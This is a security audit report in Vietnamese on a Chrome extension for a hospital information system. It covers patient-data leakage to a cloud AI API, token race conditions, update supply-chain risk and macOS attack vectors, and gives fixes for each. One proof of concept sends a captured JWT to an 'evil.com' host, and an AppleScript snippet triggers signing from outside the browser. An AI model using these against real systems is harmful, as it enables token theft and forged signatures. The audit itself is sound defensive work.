# BÁO CÁO KIỂM TOÁN BẢO MẬT TOÀN DIỆN

## Dự án: Aladinn — VNPT HIS Assistant v1.0.0

## Nền tảng mục tiêu: macOS (Chrome Extension — Manifest V3)

- **Ngày kiểm toán:** 07/04/2026
- **Phiên bản phân tích:** v1.0.0 (commit hiện tại)
- **Phạm vi:** Toàn bộ source code — 4 module chính (Voice, Scanner, Sign, CDS)
- **Phương pháp:** Static Code Analysis + Threat Modeling (STRIDE) + macOS Platform Risk Assessment

---

## MỤC LỤC

1. [Tổng quan Kiến trúc và Bề mặt Tấn công](#1-tổng-quan-kiến-trúc-và-bề-mặt-tấn-công)
2. [Ma trận STRIDE](#2-ma-trận-stride)
3. [Phát hiện Chi tiết](#3-phát-hiện-chi-tiết)
4. [Đánh giá Biện pháp Bảo mật Hiện có](#4-đánh-giá-biện-pháp-bảo-mật-hiện-có)
5. [Bảng Tổng hợp và Ưu tiên](#5-bảng-tổng-hợp-và-ưu-tiên-xử-lý)
6. [Khuyến nghị](#6-khuyến-nghị-tổng-thể)

---

## 1. Tổng quan Kiến trúc và Bề mặt Tấn công

### Luồng Dữ liệu

```text
VNPT HIS (vncare.vn)
├── DOM / jQuery Grid ──read──▶ Content Scripts
├── jsonrpc.AjaxJson ──call──▶ Injected Scripts (MAIN world)
└── Hidden iFrames ──────────▶ Content Scripts (all_frames)
                                     │
                        ┌────────────┼────────────┐
                   postMessage   chrome.runtime    chrome.storage
                        │            │                   │
                  Injected      Service Worker      Options/Popup
                  Scripts        (Background)
                                     │
                              ┌──────┴──────┐
                         Gemini API    GitHub API
```

### Bề mặt Tấn công

| Vùng | Mô tả | Rủi ro |
| --- | --- | --- |
| postMessage Bridge | Content ↔ Injected communication | XSS Relay, Payload Tampering |
| API Bridge (MAIN world) | Truy cập jsonrpc.AjaxJson | Arbitrary SP execution |
| Gemini API | Gửi dữ liệu y khoa ra cloud | PHI Leakage |
| GitHub Updater | Fetch releases từ GitHub | Supply Chain, MITM |
| chrome.storage | Lưu encrypted key, settings | Key Extraction |
| Auto-Click system | MutationObserver + setInterval | Privilege Escalation |
| localStorage | Cache settings, daily counters | Cross-session data leak |
| macOS Platform | Keychain không dùng, TM backup | Platform-specific risks |

### Permissions Audit

```json
{
  "permissions": ["activeTab", "alarms", "scripting", "storage", "tabs", "webNavigation"],
  "host_permissions": ["*://*.vncare.vn/*", "https://generativelanguage.googleapis.com/*"]
}
```

> Lưu ý: `scripting` cho phép `executeScript` vào tất cả frames trên vncare.vn.
> `tabs` cho phép đọc URL mọi tab — nên xem xét giới hạn sang `activeTab`.

---

## 2. Ma trận STRIDE

| Threat | Component | Severity | Status |
| --- | --- | --- | --- |
| Spoofing | API Bridge token verification | Medium | Partially mitigated |
| Tampering | postMessage payloads | High | Token-based protection |
| Repudiation | Signing actions (no audit log) | Medium | No audit trail |
| Information Disclosure | PHI → Gemini API | Critical | De-identification exists but incomplete |
| Denial of Service | Rate limiter bypass | Low | Rate limit implemented |
| Elevation of Privilege | Auto-click in all frames | High | Feature flag exists |

---

## 3. Phát hiện Chi tiết

---

### SEC-01: Rò rỉ PHI qua Google Gemini API

#### Mức độ: CRITICAL

Vi phạm tiềm tàng Nghị định 13/2023/NĐ-CP về Bảo vệ dữ liệu cá nhân.

- **Files:** `content/voice/ai.js` (deIdentifyText, line 136-156), `background/ai-client.js` (buildSystemPrompt)

Hàm `deIdentifyText()` đã implement khử danh tính cơ bản — đây là điểm tích cực. Tuy nhiên vẫn tồn tại bypass:

| # | Kịch bản bypass | Ví dụ | Filter |
| --- | --- | --- | --- |
| 1 | Họ hiếm/dân tộc | K'Brêoh Thị Lan | Không |
| 2 | Tên viết thường | nguyễn thị lan | Không |
| 3 | Tên kèm chức danh | BS. Trần Văn A | Có thể miss |
| 4 | Địa chỉ nhà | 123 Nguyễn Huệ, Q1 | Không |
| 5 | Số BHYT bất thường | DN4012345678901 | Có thể miss |

#### Rủi ro macOS

Speech-to-Text qua microphone. Nếu bác sĩ đọc tên bệnh nhân, PHI đi thẳng qua:
Microphone → Web Speech API (local) → `deIdentifyText()` (bypass) → Gemini API (cloud)

#### Đề xuất

- Mở rộng regex: detect cụm >=2 từ viết hoa liên tiếp (pattern tên Việt)
- Thêm filter địa chỉ, email, BHYT pattern mở rộng
- Thêm toggle "Strict Privacy Mode" trong Options — opt-out AI cloud hoàn toàn

---

### SEC-02: API Bridge — XSS Relay và Token Race Condition

#### Mức độ: HIGH

- **Files:** `injected/api-bridge.js`, `content/content.js` (line 76-79), `content/scanner/messaging.js`

#### Điểm mạnh đã đạt

- `REQ_CALL_SP` đã bị xóa — không còn gọi SP tùy ý
- Token-based authentication (`crypto.randomUUID()`)
- Origin check + Whitelist 6 intent cụ thể

#### Lỗ hổng còn tồn tại

2a. Token visible trong DOM (`content.js:78`):

```javascript
script.dataset.aladinnToken = token; // Visible trước khi script.remove()
```

Race condition ~50-200ms: MutationObserver có thể đọc token trước khi `<script>` bị xóa.

2b. Token trên window object (`content.js:79`):

```javascript
window.__ALADINN_BRIDGE_TOKEN__ = token; // Content script isolated world
```

Tuy isolated world an toàn, nhưng nếu extension khác bị compromise thì có thể đọc.

2c. Input `rowId` không validate:

```javascript
function fetchVitals(rowId, requestId) {
    const rowData = grid.jqGrid('getRowData', rowId); // rowId truyền thẳng
}
```

#### Đề xuất khắc phục SEC-02

- Truyền token qua `MessageChannel` thay DOM attribute
- Validate `rowId`: `/^[a-zA-Z0-9\-_]{1,64}$/`
- Thêm CSP vào manifest.json

---

### SEC-03: Auto-Updater Supply Chain Attack

#### Mức độ: HIGH — Supply Chain

- **File:** `background/updater.js`

```javascript
// Fetch từ GitHub không verify integrity
const apiUrl = `https://api.github.com/repos/${UPDATE_CONFIG.githubRepo}/releases/latest`;
```

| Vector | Khả năng | Tác động |
| --- | --- | --- |
| GitHub account compromised | Thấp | Cao — Toàn bộ user bị malware |
| DNS hijacking mạng BV | Trung bình | Cao — Fake release |
| Fallback updateJsonUrl spoofing | Trung bình | Cao — Inject qua GitHub Pages |

macOS: Gatekeeper/XProtect không scan Chrome Extensions. Extension không phải binary nên bypass hoàn toàn OS security.

#### Đề xuất khắc phục SEC-03

- Thêm SHA-256 integrity verification cho update zip
- Pin CSP connect-src chỉ cho phép GitHub + Gemini domains
- Ký release bằng GPG key

---

### SEC-04: JWT/Token Exposure via CustomEvent

#### Mức độ: HIGH — JWT Exposure

- **Files:** `injected/token-capture.js`, `injected/ajax-interceptor.js`

```javascript
// token-capture.js:13 — JWT broadcast qua CustomEvent (MAIN world)
window.dispatchEvent(new CustomEvent('__aladinn_token', { detail: { token } }));

// window.JWTStore — global object, bất kỳ script nào đều đọc được
window.JWTStore = { get: () => _token, set: (t) => { _token = t; } };
```

PoC — bất kỳ script nào trên vncare.vn có thể eavesdrop:

```javascript
window.addEventListener('__aladinn_token', (e) => {
    fetch('https://evil.com/steal', { method: 'POST', body: e.detail.token });
});
```

#### Đề xuất khắc phục SEC-04

- Sử dụng `Symbol.for()` key thay global object
- Hoặc tốt hơn: communicate qua `chrome.runtime` (isolated world)

---

### SEC-05: Auto-Click Privilege Escalation

#### Mức độ: MEDIUM-HIGH

- **Files:** `content/sign/auto-click-helper.js`, `content/sign/signing.js`

```javascript
// auto-click-helper.js — Polling mỗi 1s, click bất kỳ #btnConfirm nào
setInterval(() => {
    if (!isSignModuleEnabled) return;
    if (window.__aladinnSigningActive) return; // Skip nếu signing active

    const confirmBtn = findInShadowRoots('#btnConfirm');
    if (confirmBtn) confirmBtn.click(); // Click BẤT KỲ button nào match
}, 1000);
```

Kịch bản: Nếu Stored XSS inject button ẩn có id `btnConfirm`, auto-click sẽ trigger.

macOS: AppleScript có thể trigger `⌘⇧S` (start-signing) → kết hợp auto-click → ký số mà bác sĩ không biết.

#### Đề xuất khắc phục SEC-05

- Chỉ chạy khi `__aladinnSigningActive === true`
- Verify button nằm trong HIS modal container (`.jBox-container`, `.ui-dialog`)

---

### SEC-06: localStorage Data Persistence

#### Mức độ: MEDIUM

- **File:** `shared/storage.js`

localStorage trên vncare.vn thuộc origin HIS — bất kỳ script nào đều đọc được. Dữ liệu không bị xóa khi logout hoặc uninstall extension.

Đặc thù macOS:

- Chrome localStorage: `~/Library/Application Support/Google/Chrome/Default/Local Storage/`
- Time Machine backup tự động — dữ liệu tồn tại vĩnh viễn
- Spotlight có thể index LevelDB files

#### Đề xuất khắc phục SEC-06

Xóa localStorage keys khi SESSION_LOGOUT, migrate sensitive data sang `chrome.storage.session`.

---

### SEC-07: macOS-Specific Attack Vectors

#### Mức độ: MEDIUM (tổng hợp)

#### 7a. AppleScript Automation Abuse

```applescript
-- Trigger signing từ bên ngoài Chrome
tell application "System Events"
    keystroke "s" using {command down, shift down}
end tell
```

#### 7b. Chrome Profile Exposure

| Dữ liệu | Vị trí macOS | Rủi ro |
| --- | --- | --- |
| chrome.storage.local | ~/Library/.../Local Storage/leveldb/ | Đọc bằng bất kỳ process |
| Extension source | ~/Library/.../Extensions/id/ | Xem toàn bộ code |
| Console logs | ~/Library/.../chrome_debug.log | Chứa Aladinn logs |

#### 7c. Shared Kiosk

Logout purge chrome.storage nhưng localStorage + Chrome cache chưa clean.

#### 7d. Microphone Persistence

macOS grant microphone per-app (Chrome), không per-extension — extension compromised có thể ghi âm liên tục.

---

## 4. Đánh giá Biện pháp Bảo mật Hiện có

### Điểm mạnh (Đã triển khai tốt)

| # | Biện pháp | Đánh giá |
| --- | --- | --- |
| 1 | AES-GCM + PBKDF2 (100K iterations) cho API Key | Xuất sắc |
| 2 | Timing-safe PIN verification | Chống timing attack |
| 3 | Session timeout 30 phút tự lock PIN | Tốt |
| 4 | Logout detection và cache purge | Pattern coverage tốt |
| 5 | Bridge token (randomUUID per session) | Tốt |
| 6 | Whitelist-only bridge intents (xóa REQ_CALL_SP) | Xuất sắc |
| 7 | PHI de-identification cơ bản | Cần mở rộng |
| 8 | Diagnostic log sanitization (không log PHI) | Tốt |
| 9 | textContent thay innerHTML cho data | Chống XSS |
| 10 | Auto-migrate plaintext → encrypted | Legacy cleanup tốt |

### Cần cải thiện

| # | Thiếu sót | Ưu tiên |
| --- | --- | --- |
| 1 | Không có CSP trong manifest | High |
| 2 | Không có audit log cho signing | Medium |
| 3 | Không validate rowId | High |
| 4 | Diagnostic logs render qua innerHTML (options.js:633) | High |
| 5 | Auto-click chạy khi không cần thiết | Medium |

---

## 5. Bảng Tổng hợp và Ưu tiên Xử lý

| ID | Lỗ hổng | Severity | CVSS | Ưu tiên |
| --- | --- | --- | --- | --- |
| SEC-01 | PHI Leakage qua Gemini | Critical | 8.5 | P0 — Ngay |
| SEC-02 | Bridge token race + rowId | High | 7.2 | P1 — Sprint này |
| SEC-03 | Update supply chain | High | 7.8 | P1 — Sprint này |
| SEC-04 | JWT CustomEvent exposure | High | 7.5 | P1 — Sprint này |
| SEC-05 | Auto-click escalation | Medium-High | 6.5 | P2 — Sprint sau |
| SEC-06 | localStorage persistence | Medium | 5.5 | P2 — Sprint sau |
| SEC-07 | macOS-specific vectors | Medium | 5.0 | P3 — Backlog |

---

## 6. Khuyến nghị Tổng thể

### P0 — Ngay lập tức

1. Nâng cấp `deIdentifyText()` — Mở rộng regex, thêm filter địa chỉ/email
2. Thêm "Strict Privacy Mode" — Opt-out hoàn toàn AI cloud

### P1 — Sprint này

1. Chuyển bridge token từ DOM attribute sang MessageChannel
2. Thêm CSP vào manifest.json
3. Validate `rowId` bằng regex
4. Thay `innerHTML` bằng `textContent` trong diagnostic renderer
5. Ẩn JWT — Symbol key hoặc Chrome runtime thay global

### P2 — Sprint sau

1. Auto-click guard — Chỉ click khi signing active + verified modal
2. localStorage cleanup khi logout
3. Signing audit log

### P3 — Backlog

1. macOS hardening guide cho bệnh viện
2. Chrome Enterprise Policy recommendations
3. Penetration test trên staging

---

Kết luận: Aladinn v1.0.0 có nền tảng bảo mật vững chắc — đặc biệt module mã hóa (PBKDF2+AES-GCM), timing-safe verification, và whitelist bridge. Các lỗ hổng chủ yếu nằm ở ranh giới extension và page context (postMessage, CustomEvent) — vùng khó bảo vệ nhất trong Chrome Extension. Đề xuất tập trung defense-in-depth.

---

Báo cáo v2.0 — 07/04/2026 (cập nhật từ v1.0 ngày 28/03/2026)
